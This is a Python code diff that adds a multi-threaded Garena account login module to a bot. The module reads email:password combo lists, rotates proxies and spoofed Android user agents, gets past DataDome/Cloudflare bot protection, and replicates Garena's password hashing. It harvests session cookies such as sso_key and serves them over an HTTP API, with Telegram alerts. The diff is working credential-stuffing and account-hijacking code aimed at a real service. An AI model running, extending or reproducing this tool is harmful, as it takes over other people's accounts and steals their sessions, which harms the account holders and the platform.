@@ -37,6 +37,8 @@ import json
 import random
 import signal
 import string
+import hashlib
+import uuid
 import urllib.parse
 import threading
 import requests
@@ -44,6 +46,14 @@ from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
+
+# AES encryption for Garena password hashing (same as dec_tyrantv12.py)
+try:
+    from Crypto.Cipher import AES
+    _AES_AVAILABLE = True
+except ImportError:
+    _AES_AVAILABLE = False
+    logger_dummy = None  # will be set after logger init
 
 # ═══════════════════════════════════════════════════════════════
 #  CONFIGURATION
@@ -860,6 +870,51 @@ class CookieUpdater:
             logger.info(f"[COOKIE] write_cookie: trimmed {trimmed} lines beyond limit ({self.MAX_COOKIE_LINES} kept)")
         logger.info(f"[COOKIE] Wrote {len(lines)} cookie line(s) to {self.filepath}")
 
+    def append_cookie(self, cookie_line: str):
+        """Append a single cookie line to the file (thread-safe, auto-capped at MAX_COOKIE_LINES).
+
+        Used by GarenaCookieWorker threads — each successful login appends
+        its full cookie so the /cookie API always has many fresh cookies.
+        Duplicates (same sso_key) are replaced; otherwise appended.
+        """
+        cookie_line = cookie_line.strip()
+        if not cookie_line:
+            return
+        dirpath = os.path.dirname(self.filepath)
+        if dirpath:
+            os.makedirs(dirpath, exist_ok=True)
+        with self._lock:
+            # Extract sso_key from the new line to check for duplicates
+            new_sso = None
+            for part in cookie_line.split(";"):
+                kv = part.strip()
+                if kv.startswith("sso_key="):
+                    new_sso = kv.split("=", 1)[1]
+                    break
+
+            # If same sso_key exists, replace that line instead of appending
+            if new_sso:
+                replaced = False
+                for i, existing in enumerate(self._lines_cache):
+                    if f"sso_key={new_sso}" in existing:
+                        self._lines_cache[i] = cookie_line
+                        replaced = True
+                        break
+                if not replaced:
+                    self._lines_cache.append(cookie_line)
+            else:
+                self._lines_cache.append(cookie_line)
+
+            # Cap at MAX_COOKIE_LINES — drop oldest if over limit
+            if len(self._lines_cache) > self.MAX_COOKIE_LINES:
+                self._lines_cache = self._lines_cache[-self.MAX_COOKIE_LINES:]
+
+            # Write entire cache to disk
+            with open(self.filepath, "w") as f:
+                for line in self._lines_cache:
+                    f.write(line + "\n")
+        logger.debug(f"[COOKIE] Appended cookie (total: {len(self._lines_cache)} lines)")
+
 
 
 
@@ -1263,9 +1318,658 @@ class ComboStats:
             }
 
 
-# ═══════════════════════════════════════════════════════════════
-#  DATADOME FETCHER
-# ═══════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  GARENA LOGIN MODULE (ported from dec_tyrantv12.py)
+#  Prelogin → Login → Full Cookie (sso_key + datadome + all session fields)
+# ══════════════════════════════════════════════════════════════════════════════
+
+_ANDROID_DEVICES = [
+    ("Xiaomi Redmi Note 11", "RP1A.200720.011"),
+    ("Xiaomi Redmi Note 10 Pro", "RQ3A.211001.001"),
+    ("Xiaomi Redmi 10C", "V410226"),
+    ("Xiaomi Redmi 9A", "RP1A.200720.011"),
+    ("Xiaomi Redmi Note 12 Pro", "TQ3A.230901.525"),
+    ("Xiaomi POCO X5 5G", "TQ3A.230901.525"),
+    ("Xiaomi 12", "SQ3A.220605.009"),
+    ("Xiaomi 13", "TQ3A.230901.525"),
+    ("Samsung Galaxy A14", "UP1A.231005.007"),
+    ("Samsung Galaxy A13", "TP1A.220624.014"),
+    ("Samsung Galaxy A12", "SP1A.210812.016"),
+    ("Samsung Galaxy A34 5G", "UP1A.231005.007"),
+    ("Samsung Galaxy A33 5G", "TP1A.220624.014"),
+    ("Samsung Galaxy A54 5G", "UP1A.231005.007"),
+    ("Samsung Galaxy S21", "RP1A.200720.011"),
+    ("Samsung Galaxy S22", "SP1A.210812.016"),
+    ("Samsung Galaxy S23", "TQ3A.230901.525"),
+    ("Samsung Galaxy S24", "UP1A.231005.007"),
+    ("Oppo A57", "RP1A.200720.011"),
+    ("Oppo A78 5G", "UP1A.231005.007"),
+    ("Oppo A58", "UP1A.231005.007"),
+    ("Oppo Reno 8 5G", "SP1A.210812.016"),
+    ("Oppo Reno 9 5G", "TQ3A.230901.525"),
+    ("Oppo Reno 10 5G", "UP1A.231005.007"),
+    ("Vivo Y35", "RP1A.200720.011"),
+    ("Vivo Y56 5G", "UP1A.231005.007"),
+    ("Vivo Y75 5G", "SP1A.210812.016"),
+    ("Vivo V29 5G", "UP1A.231005.007"),
+    ("Vivo V27 5G", "TQ3A.230901.525"),
+    ("Realme C55", "SP1A.210812.016"),
+    ("Realme C53", "SP1A.210812.016"),
+    ("Realme C33", "RP1A.200720.011"),
+    ("Realme 10", "RP1A.200720.011"),
+    ("Realme 11", "SP1A.210812.016"),
+    ("Realme Narzo 60 5G", "TQ3A.230901.525"),
+    ("OnePlus Nord CE 3 Lite", "UP1A.231005.007"),
+    ("OnePlus Nord N30", "UP1A.231005.007"),
+    ("OnePlus 11", "TQ3A.230901.525"),
+    ("OnePlus 12", "UP1A.231005.007"),
+    ("Huawei Nova Y90", "RP1A.200720.011"),
+    ("Huawei Nova Y72", "RP1A.200720.011"),
+    ("Huawei P60 Pro", "TQ3A.230901.525"),
+    ("Huawei Mate 50 Pro", "TQ3A.230901.525"),
+    ("Infinix Hot 30", "SP1A.210812.016"),
+    ("Infinix Note 30", "SP1A.210812.016"),
+    ("Infinix Smart 7", "RP1A.200720.011"),
+    ("Tecno Spark 20", "SP1A.210812.016"),
+    ("Tecno Camon 20", "SP1A.210812.016"),
+    ("Tecno Pova 5", "SP1A.210812.016"),
+    ("Motorola Moto G Power (2022)", "RQ3A.211001.001"),
+    ("Motorola Moto G Stylus (2022)", "RQ3A.211001.001"),
+    ("Motorola Moto G84 5G", "UP1A.231005.007"),
+    ("Motorola Edge 40", "TQ3A.230901.525"),
+    ("Nokia G42 5G", "UP1A.231005.007"),
+    ("Nokia C32", "RP1A.200720.011"),
+    ("Nokia C22", "RP1A.200720.011"),
+    ("Asus ROG Phone 7", "UP1A.231005.007"),
+    ("Asus Zenfone 10", "UP1A.231005.007"),
+    ("Google Pixel 6a", "SP1A.210812.016"),
+    ("Google Pixel 7a", "TQ3A.230901.525"),
+    ("Google Pixel 8", "UP1A.231005.007"),
+    ("Sony Xperia 10 V", "TQ3A.230901.525"),
+    ("Sony Xperia 1 V", "UP1A.231005.007"),
+    ("LG Wing", "RP1A.200720.011"),
+    ("LG Velvet", "RQ3A.211001.001"),
+    ("ZTE Blade V40", "RP1A.200720.011"),
+    ("ZTE Axon 40 Pro", "TQ3A.230901.525"),
+    ("Xiaomi Redmi Note 13 Pro", "UP1A.231005.007"),
+    ("Xiaomi 14", "UP1A.231005.007"),
+    ("Samsung Galaxy A15", "UP1A.231005.007"),
+    ("Samsung Galaxy A55 5G", "UP1A.231005.007"),
+    ("Oppo Find X5 Pro", "SP1A.210812.016"),
+    ("Vivo X90 Pro", "TQ3A.230901.525"),
+    ("Realme GT 3", "TQ3A.230901.525"),
+    ("OnePlus Nord CE 4", "UP1A.231005.007"),
+    ("Honor Magic5 Pro", "TQ3A.230901.525"),
+    ("Honor 90", "TQ3A.230901.525"),
+    ("Xiaomi Redmi 12", "SP1A.210812.016"),
+    ("Samsung Galaxy M14 5G", "UP1A.231005.007"),
+    ("Samsung Galaxy M34 5G", "UP1A.231005.007"),
+    ("Oppo A98 5G", "TQ3A.230901.525"),
+    ("Vivo Y36 5G", "UP1A.231005.007"),
+    ("Realme C67", "UP1A.231005.007"),
+    ("Realme 12 Pro", "UP1A.231005.007"),
+    ("Infinix Hot 40 Pro", "UP1A.231005.007"),
+    ("Tecno Spark Go 2024", "UP1A.231005.007"),
+    ("Motorola Moto G24 Power", "UP1A.231005.007"),
+    ("Nokia C34", "SP1A.210812.016"),
+    ("Asus ROG Phone 8", "UP1A.231005.007"),
+    ("Google Pixel 8a", "UP1A.231005.007"),
+    ("Xiaomi POCO M6 Pro", "UP1A.231005.007"),
+    ("Samsung Galaxy S24 Ultra", "UP1A.231005.007"),
+]
+
+_CHROME_VERSIONS = [
+    "130.0.6723.107", "131.0.6778.200", "132.0.6834.468",
+    "133.0.6943.52",  "134.0.6998.136", "135.0.7049.110",
+    "136.0.7103.126", "137.0.7151.68",  "138.0.7204.93",
+    "139.0.7255.72",  "140.0.7305.54",  "141.0.7354.30",
+    "142.0.7401.18",  "143.0.7455.6",   "144.0.7503.2",
+]
+
+_ANDROID_VERSIONS = [11, 12, 13, 14, 15]
+
+_GARENA_SDK_VERSION = "5.12.1"
+
+FULL_COOKIE_ALL_KEYS = {
+    'sso_key', 'datadome', 'PHPSESSID', 'csrf_cookie_name',
+    'token_session', 'ac_session', 'session_key', 'msdk_token_session'
+}
+
+_PRELOGIN_COOKIE_ORDER = [
+    'datadome', 'sso_key', 'apple_state_key', 'PHPSESSID',
+    'csrf_cookie_name', 'token_session', 'ac_session',
+    'session_key', 'msdk_token_session'
+]
+
+_LOGIN_COOKIE_ORDER = [
+    'datadome', 'sso_key', 'apple_state_key', 'PHPSESSID',
+    'csrf_cookie_name', 'token_session', 'ac_session',
+    'session_key', 'msdk_token_session'
+]
+
+
+def _garena_random_ua():
+    """Generate a randomised Garena Android User-Agent string.
+
+    Same as dec_tyrantv12.py random_ua().
+
+    Returns:
+        ua_full     – full WebView UA (for browser-facing requests)
+        ua_short    – short GarenaMSDK UA (for token-exchange / SDK requests)
+        chrome_major – major version string  (e.g. "144")
+        dev_id      – random device ID  (e.g. "02-<uuid4>")
+    """
+    device, build = random.choice(_ANDROID_DEVICES)
+    chrome        = random.choice(_CHROME_VERSIONS)
+    android       = random.choice(_ANDROID_VERSIONS)
+    chrome_major  = chrome.split(".")[0]
+    dev_id        = f"02-{uuid.uuid4()}"
+
+    ua_full = (
+        f"Mozilla/5.0 (Linux; Android {android}; {device} "
+        f"Build/{build}; wv) AppleWebKit/537.36 "
+        f"(KHTML, like Gecko) Version/4.0 "
+        f"Chrome/{chrome} Mobile Safari/537.36; "
+        f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
+    )
+    ua_short = f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
+    return ua_full, ua_short, chrome_major, dev_id
+
+
+def _build_garena_headers():
+    """Build a full set of Garena/Android request headers with a random UA.
+
+    Same as dec_tyrantv12.py build_garena_headers().
+    """
+    ua_full, _ua_short, chrome_major, _dev_id = _garena_random_ua()
+    return {
+        "User-Agent":        ua_full,
+        "Accept":            "application/json, text/plain, */*",
+        "Accept-Encoding":   "gzip, deflate, br, zstd",
+        "Accept-Language":   "en-US,en;q=0.9",
+        "sec-ch-ua":         (
+            f'"Chromium";v="{chrome_major}", '
+            f'"Not(A:Brand";v="8", '
+            f'"Android WebView";v="{chrome_major}"'
+        ),
+        "sec-ch-ua-mobile":   "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "sec-fetch-dest":     "empty",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-site":     "same-origin",
+        "x-requested-with":   "com.garena.game.codm",
+        "Origin":             "https://100082.connect.garena.com",
+        "Referer": (
+            "https://100082.connect.garena.com/universal/oauth"
+            "?client_id=100082&locale=en-US&create_grant=true"
+            "&login_scenario=normal&redirect_uri=gop100082://auth/"
+            "&response_type=code"
+        ),
+    }
+
+
+
+def _encode(plaintext, key):
+    """AES-ECB encryption helper (same as dec_tyrantv12.py).
+
+    Both plaintext and key are hex strings — converted to raw bytes before encryption.
+    Returns first 32 hex chars of the ciphertext (128 bits).
+    """
+    if not _AES_AVAILABLE:
+        return plaintext  # fallback — won't work for real login
+    from Crypto.Cipher import AES
+    key_bytes = bytes.fromhex(key)
+    plaintext_bytes = bytes.fromhex(plaintext)
+    cipher = AES.new(key_bytes, AES.MODE_ECB)
+    ciphertext = cipher.encrypt(plaintext_bytes)
+    return ciphertext.hex()[:32]
+
+
+def _get_passmd5(password):
+    """MD5 hash of password (same as dec_tyrantv12.py).
+    Decodes URL-encoded password first, then MD5.
+    """
+    decoded_password = urllib.parse.unquote(password)
+    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()
+
+
+def _hash_password(password, v1, v2):
+    """SHA256 + AES password hashing (same as dec_tyrantv12.py).
+
+    Flow: passmd5 = MD5(decoded_password)
+          inner_hash = SHA256(passmd5 + v1).hexdigest()
+          outer_hash = SHA256(inner_hash + v2).hexdigest()
+          result = AES_ECB_encrypt(passmd5_hex_as_bytes, outer_hash_as_bytes)[:32]
+    """
+    pass_md5 = _get_passmd5(password)
+    inner_hash = hashlib.sha256((pass_md5 + v1).encode()).hexdigest()
+    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
+    return _encode(pass_md5, outer_hash)
+
+
+def _build_cookie_header(cookie_dict, order=None):
+    """Build a Cookie header string from a dict, using the specified key order."""
+    if order is None:
+        order = list(cookie_dict.keys())
+    parts = []
+    for key in order:
+        if key in cookie_dict and cookie_dict[key]:
+            parts.append(f"{key}={cookie_dict[key]}")
+    return "; ".join(parts)
+
+
+def _garena_prelogin(session, account, cookie_dict, proxy=None):
+    """Perform Garena prelogin to get v1, v2 challenge and fresh session cookies.
+
+    Same flow as dec_tyrantv12.py: GET request with params, parse Set-Cookie,
+    store important cookies on the session object for automatic reuse.
+
+    Args:
+        session: cloudscraper.create_scraper() session  (cookies stored on session)
+        account: str  (email:password combo or just email)
+        cookie_dict: dict  (additional cookie fields to include in request)
+        proxy: str or None  (proxy URL)
+
+    Returns:
+        (v1, v2, cookie_dict) on success  (cookie_dict also updated)
+        (None, None, cookie_dict) on failure
+    """
+    email = account.split(":")[0] if ":" in account else account
+    url = "https://100082.connect.garena.com/api/prelogin"
+
+    try:
+        email.encode('latin-1')
+    except UnicodeEncodeError:
+        return None, None, cookie_dict
+
+    params = {
+        'app_id': '100082',
+        'account': email,
+        'format': 'json',
+        'id': str(int(time.time() * 1000)),
+    }
+
+    # Build cookie header from session cookies + cookie_dict (same as dec_tyrantv12.py)
+    current_session_cookies = {}
+    try:
+        current_session_cookies = session.cookies.get_dict()
+    except Exception:
+        pass
+
+    # Merge: session cookies first (in order), then cookie_dict extras
+    all_cookies = {}
+    all_cookies.update(current_session_cookies)
+    all_cookies.update(cookie_dict)  # cookie_dict overrides session if conflict
+
+    cookie_parts = []
+    for k in _PRELOGIN_COOKIE_ORDER:
+        if k in all_cookies and all_cookies[k]:
+            cookie_parts.append(f"{k}={all_cookies[k]}")
+    for k, v in all_cookies.items():
+        if k not in _PRELOGIN_COOKIE_ORDER and v:
+            cookie_parts.append(f"{k}={v}")
+    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
+
+    ua_full, ua_short, chrome_major, dev_id = _garena_random_ua()
+    headers = _build_garena_headers()
+    headers['accept-encoding'] = 'gzip, deflate, br, zstd'
+    headers['connection'] = 'keep-alive'
+    headers['host'] = '100082.connect.garena.com'
+    headers['user-agent'] = ua_full
+    if cookie_header:
+        headers['cookie'] = cookie_header
+
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    try:
+        resp = session.get(url, headers=headers, params=params, proxies=proxies, timeout=10)
+
+        # Parse Set-Cookie — same method as dec_tyrantv12.py
+        new_cookies = {}
+        if 'set-cookie' in resp.headers:
+            set_cookie_header = resp.headers['set-cookie']
+            for cookie_str in set_cookie_header.split(','):
+                if '=' in cookie_str:
+                    try:
+                        cookie_name = cookie_str.split('=')[0].strip()
+                        cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
+                        if cookie_name and cookie_value:
+                            new_cookies[cookie_name] = cookie_value
+                    except Exception:
+                        pass
+
+        # Also grab from response.cookies
+        try:
+            response_cookies = resp.cookies.get_dict()
+            for cookie_name, cookie_value in response_cookies.items():
+                if cookie_name not in new_cookies:
+                    new_cookies[cookie_name] = cookie_value
+        except Exception:
+            pass
+
+        # Store important cookies on the session object (same as dec_tyrantv12.py)
+        for cookie_name, cookie_value in new_cookies.items():
+            if cookie_name in FULL_COOKIE_ALL_KEYS or cookie_name in ('datadome', 'apple_state_key'):
+                try:
+                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
+                except Exception:
+                    pass
+
+        # Also update cookie_dict for the caller
+        for cookie_name, cookie_value in new_cookies.items():
+            if cookie_name in FULL_COOKIE_ALL_KEYS or cookie_name == 'datadome':
+                cookie_dict[cookie_name] = cookie_value
+
+        if resp.status_code == 403:
+            return None, None, cookie_dict
+
+        if resp.status_code == 200:
+            try:
+                data = resp.json()
+                v1 = data.get("v1", "")
+                v2 = data.get("v2", "")
+                if v1 and v2:
+                    return v1, v2, cookie_dict
+                else:
+                    return None, None, cookie_dict
+            except Exception:
+                return None, None, cookie_dict
+        else:
+            return None, None, cookie_dict
+    except Exception:
+        return None, None, cookie_dict
+
+def _garena_login(session, account, password, v1, v2, cookie_dict, proxy=None):
+    """Perform Garena login to get sso_key and full session cookies.
+
+    Same flow as dec_tyrantv12.py: GET request with params, hash password via v1/v2,
+    extract sso_key from Set-Cookie (not JSON body), store on session.
+
+    Args:
+        session: cloudscraper session  (cookies carried on session)
+        account: str  (email)
+        password: str  (plain text password)
+        v1: str  (from prelogin)
+        v2: str  (from prelogin)
+        cookie_dict: dict  (additional cookie fields)
+        proxy: str or None  (proxy URL)
+
+    Returns:
+        (sso_key, cookie_dict) on success
+        (None, cookie_dict) on failure
+    """
+    hashed_password = _hash_password(password, v1, v2)
+    url = "https://100082.connect.garena.com/api/login"
+    params = {
+        'app_id': '100082',
+        'account': account,
+        'password': hashed_password,
+        'redirect_uri': 'gop100082://auth/',
+        'format': 'json',
+        'id': str(int(time.time() * 1000)),
+    }
+
+    # Build cookie header from session cookies + cookie_dict (same as dec_tyrantv12.py)
+    current_session_cookies = {}
+    try:
+        current_session_cookies = session.cookies.get_dict()
+    except Exception:
+        pass
+
+    all_cookies = {}
+    all_cookies.update(current_session_cookies)
+    all_cookies.update(cookie_dict)
+
+    cookie_parts = []
+    for k in _LOGIN_COOKIE_ORDER:
+        if k in all_cookies and all_cookies[k]:
+            cookie_parts.append(f"{k}={all_cookies[k]}")
+    for k, v in all_cookies.items():
+        if k not in _LOGIN_COOKIE_ORDER and v:
+            cookie_parts.append(f"{k}={v}")
+    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
+
+    ua_full, ua_short, chrome_major, dev_id = _garena_random_ua()
+    headers = _build_garena_headers()
+    headers['host'] = '100082.connect.garena.com'
+    headers['user-agent'] = ua_full
+    if cookie_header:
+        headers['cookie'] = cookie_header
+
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    try:
+        resp = session.get(url, headers=headers, params=params, proxies=proxies, timeout=18)
+
+        # Parse Set-Cookie — same method as dec_tyrantv12.py
+        login_cookies = {}
+        if 'set-cookie' in resp.headers:
+            set_cookie_header = resp.headers['set-cookie']
+            for cookie_str in set_cookie_header.split(','):
+                if '=' in cookie_str:
+                    try:
+                        cookie_name = cookie_str.split('=')[0].strip()
+                        cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
+                        if cookie_name and cookie_value:
+                            login_cookies[cookie_name] = cookie_value
+                    except Exception:
+                        pass
+
+        # Also grab from response.cookies
+        try:
+            response_cookies = resp.cookies.get_dict()
+            for cookie_name, cookie_value in response_cookies.items():
+                if cookie_name not in login_cookies:
+                    login_cookies[cookie_name] = cookie_value
+        except Exception:
+            pass
+
+        # Store important cookies on the session object (same as dec_tyrantv12.py)
+        for cookie_name, cookie_value in login_cookies.items():
+            if cookie_name in FULL_COOKIE_ALL_KEYS or cookie_name in ('datadome', 'apple_state_key'):
+                try:
+                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
+                except Exception:
+                    pass
+
+        # Also update cookie_dict for the caller
+        for cookie_name, cookie_value in login_cookies.items():
+            if cookie_name in FULL_COOKIE_ALL_KEYS:
+                cookie_dict[cookie_name] = cookie_value
+
+        # Extract sso_key from cookies (not JSON body — same as dec_tyrantv12.py)
+        sso_key = login_cookies.get('sso_key') or resp.cookies.get('sso_key')
+
+        if resp.status_code == 200:
+            try:
+                data = resp.json()
+                # Check for error in response
+                if 'error' in data:
+                    return None, cookie_dict
+            except Exception:
+                pass
+
+            if sso_key:
+                cookie_dict['sso_key'] = sso_key
+                # Also store on session
+                try:
+                    session.cookies.set('sso_key', sso_key, domain='.garena.com')
+                except Exception:
+                    pass
+                return sso_key, cookie_dict
+            else:
+                return None, cookie_dict
+        else:
+            return None, cookie_dict
+    except Exception:
+        return None, cookie_dict
+
+
+class GarenaCookieWorker:
+    """Independent worker thread: continuously gets full cookies via Garena login.
+
+    Each worker runs its own loop:
+        get_next combo account → get_next proxy → prelogin → login → append full cookie
+    No shared lock between workers — each one operates independently and fast.
+    Cookies are appended (not overwritten) so many accounts build up over time.
+    """
+
+    def __init__(self, worker_id, combo_manager, proxy_scanner, cookie_updater, dd_pool=None):
+        self.worker_id = worker_id
+        self.combo_manager = combo_manager
+        self.proxy_scanner = proxy_scanner
+        self.cookie_updater = cookie_updater
+        self.dd_pool = dd_pool
+        self._attempts = 0
+        self._successes = 0
+        self._failures = 0
+        self._last_error = ""
+        self._alive = False
+
+    def run_once(self):
+        """One cycle: account → proxy → prelogin → login → append cookie.
+
+        Returns True on success, False on failure.
+        """
+        self._attempts += 1
+
+        # 1) Get next combo account (round-robin, thread-safe)
+        account_line = self.combo_manager.get_next()
+        if not account_line:
+            self._last_error = "no combo accounts"
+            return False
+
+        parts = account_line.strip().split(":")
+        if len(parts) < 2:
+            self._last_error = f"bad combo format: {account_line[:30]}"
+            return False
+        email, password = parts[0], parts[1]
+
+        # 2) Get next proxy (per-thread rotation, skips cooldown proxies)
+        proxy_dict, proxy_url = self.proxy_scanner.get_next(thread_id=self.worker_id)
+        if not proxy_url:
+            self._last_error = "no proxy available"
+            return False
+
+        # 3) Optionally get a fresh datadome to seed the prelogin
+        datadome_val = ""
+        if self.dd_pool:
+            try:
+                dd = self.dd_pool.get_datadome()
+                if dd:
+                    datadome_val = dd
+            except Exception:
+                pass
+
+        # 4) Initialize cookie dict
+        cookie_dict = {}
+        if datadome_val:
+            cookie_dict["datadome"] = datadome_val
+
+        # 5) Create a fresh cloudscraper session (bypasses DataDome/Cloudflare)
+        try:
+            import cloudscraper as _cs
+            sess = _cs.create_scraper()
+        except ImportError:
+            sess = requests.Session()
+
+        # Set proxy on session — all requests use this proxy
+        if proxy_url:
+            sess.proxies.update({"http": proxy_url, "https": proxy_url})
+        sess.verify = False
+
+        # 6) Prelogin
+        try:
+            v1, v2, cookie_dict = _garena_prelogin(sess, email, cookie_dict, proxy=proxy_url)
+        except Exception as e:
+            self._last_error = f"prelogin exception: {e}"
+            self._failures += 1
+            return False
+
+        if not v1 or not v2:
+            self._last_error = f"prelogin failed (no v1/v2) for {email}"
+            self._failures += 1
+            return False
+
+        # 7) Login
+        try:
+            sso_key, cookie_dict = _garena_login(sess, email, password, v1, v2, cookie_dict, proxy=proxy_url)
+        except Exception as e:
+            self._last_error = f"login exception: {e}"
+            self._failures += 1
+            return False
+
+        if not sso_key:
+            self._last_error = f"login failed (no sso_key) for {email}"
+            self._failures += 1
+            return False
+
+        # 8) Build the full cookie string
+        full_cookie_parts = []
+        for key in _LOGIN_COOKIE_ORDER:
+            if key in cookie_dict and cookie_dict[key]:
+                full_cookie_parts.append(f"{key}={cookie_dict[key]}")
+        if not full_cookie_parts:
+            self._last_error = f"empty cookie dict for {email}"
+            self._failures += 1
+            return False
+
+        full_cookie_str = "; ".join(full_cookie_parts)
+
+        # 9) Append the full cookie to the cookie file (thread-safe)
+        if self.cookie_updater:
+            try:
+                self.cookie_updater.append_cookie(full_cookie_str)
+                self._successes += 1
+                self._last_error = ""
+                logger.info(f"[WORKER-{self.worker_id}] ✔ Full cookie for {email} appended (sso_key={sso_key[:12]}...)")
+                return True
+            except Exception as e:
+                self._last_error = f"cookie write error: {e}"
+                self._failures += 1
+                return False
+        else:
+            # Fallback: write directly to COOKIE_FILE
+            try:
+                with open(COOKIE_FILE, 'a') as f:
+                    f.write(full_cookie_str + "\n")
+                self._successes += 1
+                self._last_error = ""
+                return True
+            except Exception as e:
+                self._last_error = f"cookie write error: {e}"
+                self._failures += 1
+                return False
+
+    def run_loop(self, shutdown_event):
+        """Continuous loop: login → rest briefly → repeat until shutdown."""
+        self._alive = True
+        logger.info(f"[WORKER-{self.worker_id}] Starting Garena cookie worker loop")
+        while not shutdown_event.is_set():
+            try:
+                success = self.run_once()
+                if not success:
+                    # Small backoff on failure — don't hammer if proxies are dead
+                    shutdown_event.wait(timeout=2)
+                else:
+                    # Tiny pause on success — prevents CPU spin but stays fast
+                    shutdown_event.wait(timeout=0.3)
+            except Exception as e:
+                logger.warning(f"[WORKER-{self.worker_id}] Unhandled error: {e}")
+                shutdown_event.wait(timeout=3)
+        self._alive = False
+        logger.info(f"[WORKER-{self.worker_id}] Shutting down")
+
+    @property
+    def stats(self):
+        return {
+            "worker_id": self.worker_id,
+            "alive": self._alive,
+            "attempts": self._attempts,
+            "successes": self._successes,
+            "failures": self._failures,
+            "last_error": self._last_error,
+        }
+
 class DataDomeFetcher:
     """Fetches fresh DataDome cookies via rotated proxies.
     
@@ -2305,6 +3009,7 @@ class APIHandler(BaseHTTPRequestHandler):
     _scanner = None
     _stats_ref = None
     _fetcher = None
+    _cookie_workers = None
 
     def log_message(self, format, *args):
         pass  # Suppress default HTTP logging
@@ -2358,8 +3063,28 @@ class APIHandler(BaseHTTPRequestHandler):
         elif path == "/health":
             self._json_response({"status": "ok", "uptime": datetime.now().isoformat()})
 
+        elif path == "/loginstats" or path == "/workerstats":
+            # Cookie worker stats — shows each worker's attempts/successes/failures
+            workers = getattr(self, '_cookie_workers', None)
+            if workers:
+                total_attempts = sum(w._attempts for w in workers)
+                total_successes = sum(w._successes for w in workers)
+                total_failures = sum(w._failures for w in workers)
+                alive = sum(1 for w in workers if w._alive)
+                per_worker = [w.stats for w in workers]
+                self._json_response({
+                    "total_attempts": total_attempts,
+                    "total_successes": total_successes,
+                    "total_failures": total_failures,
+                    "alive_workers": alive,
+                    "total_workers": len(workers),
+                    "workers": per_worker,
+                })
+            else:
+                self._json_response({"error": "no cookie workers"})
+
         else:
-            self._json_response({"error": "Unknown endpoint", "endpoints": ["/", "/datadome", "/cookie", "/stats", "/proxylist", "/fetch", "/health"]}, 404)
+            self._json_response({"error": "Unknown endpoint", "endpoints": ["/", "/datadome", "/cookie", "/stats", "/proxylist", "/fetch", "/health", "/loginstats"]}, 404)
 
     def do_POST(self):
         path = urllib.parse.urlparse(self.path).path
@@ -2619,6 +3344,18 @@ class DataDomeBotEngine:
             self.combo_manager, self.scanner, self.updater, self.combo_stats
         )
 
+        # Garena cookie workers — 20 parallel threads doing prelogin+login continuously
+        self.cookie_workers = []
+        for i in range(NUM_WORKERS):
+            w = GarenaCookieWorker(
+                worker_id=i,
+                combo_manager=self.combo_manager,
+                proxy_scanner=self.scanner,
+                cookie_updater=self.updater,
+                dd_pool=self.dd_pool,
+            )
+            self.cookie_workers.append(w)
+
         # Telegram bot
         self.tg = TelegramBot(
             BOT_TOKEN, CHAT_ID, self.scanner, self.updater, self.fetcher, self.stats,
@@ -2633,6 +3370,7 @@ class DataDomeBotEngine:
         APIHandler._scanner = self.scanner
         APIHandler._stats_ref = self.stats
         APIHandler._fetcher = self.fetcher
+        APIHandler._cookie_workers = self.cookie_workers
 
     def run(self):
         logger.info("=" * 50)
@@ -2693,89 +3431,53 @@ class DataDomeBotEngine:
         if self.shutdown_event.is_set():
             return
 
-        # Main fetch loop — parallel workers (no Telegram spam — auto_notify removed)
-        logger.info(f"[BOT] 🚀 Starting {NUM_WORKERS}-worker parallel fetch loop...")
-        cycle_counter = [0]
-        cycle_lock = threading.Lock()
-        last_stats_log = [time.time()]
+        # ── START 20 GARENA COOKIE WORKERS ──
+        # Each worker independently: get account → get proxy → prelogin → login → append cookie
+        # No shared lock — all 20 threads run in parallel as fast as possible
+        logger.info(f"[BOT] 🚀 Starting {NUM_WORKERS} Garena cookie workers (parallel full-cookie getter)...")
+        self.tg.send_important(
+            f"🔑 <b>{NUM_WORKERS} cookie workers starting!</b>\n\n"
+            f"Each worker: account → proxy → prelogin → login → append cookie\n"
+            f"🔄 Auto-rotated proxies & accounts\n"
+            f"📋 Cookies available at /cookie API"
+        )
 
-        def worker_loop(thread_id):
-            consecutive_errors = 0
-            while not self.shutdown_event.is_set():
-                try:
-                    # ── Pause gate — workers wait here during /setdatadome inject ──
-                    if not self.dd_pool.ready.is_set():
-                        self.dd_pool.ready.wait(timeout=30)
-                        if self.shutdown_event.is_set():
-                            break
-
-                    if DELAY_MS > 0:
-                        self.shutdown_event.wait(timeout=DELAY_MS / 1000.0)
-                        if self.shutdown_event.is_set():
-                            break
-
-                    result = self.fetcher.fetch(thread_id=thread_id)
-
-                    with cycle_lock:
-                        cycle_counter[0] += 1
-
-                    if result["success"]:
-                        dd = result["datadome"]
-                        dd_short = dd[:30] + "..." if len(dd) > 30 else dd
-                        update = self.updater.update_datadome(dd)
-                        self.stats.record_fetch(True, result.get("latency_ms", 0), update.get("success", False))
-                        self.dd_pool.record_success(dd)
-                        consecutive_errors = 0  # reset on success
-
-                        if not BOT_MODE:
-                            logger.debug(f"[BOT] ✔ {dd_short} | {result.get('latency_ms', 0)}ms | proxy: {result['proxy']}")
-                    else:
-                        self.stats.record_fetch(False)
-                        current_dd = self.dd_pool.get_best()
-                        if current_dd:
-                            self.dd_pool.record_failure(current_dd)
-                        if not BOT_MODE:
-                            logger.debug(f"[BOT] ✘ {result.get('error', '?')} | proxy: {result.get('proxy', '?')}")
-
-                    # ── Console stats log every 30s (one thread wins the lock) ──
-                    now = time.time()
-                    if now - last_stats_log[0] > 30:
-                        with cycle_lock:
-                            if now - last_stats_log[0] > 30:
-                                last_stats_log[0] = now
